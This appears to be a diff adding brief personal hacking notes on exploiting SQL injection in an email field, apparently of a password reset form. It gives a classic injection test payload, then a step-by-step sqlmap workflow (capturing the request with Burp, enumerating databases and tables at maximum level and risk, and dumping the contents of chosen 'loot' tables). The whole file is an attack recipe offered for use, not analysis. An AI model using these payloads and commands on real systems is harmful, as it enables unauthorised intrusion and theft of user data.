@@ -1,0 +1,15 @@
+find if field is vulnerable
+
+select * from users where email = '' or 1=1;-- -';
+
+next use sqlmap
+
+1. use burp and copy the request to a file
+
+2. use this command to enum dbs == sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch --dbs
+
+3. infortion_schema and performance_schema are native to sql, you want to look at the others.
+
+4. use this command to enum lootdb == sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D <lootdb> --tables
+
+5. if you find an interesting table use this command to dump its data == sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D <lootdb> -T <loottables> --dump 
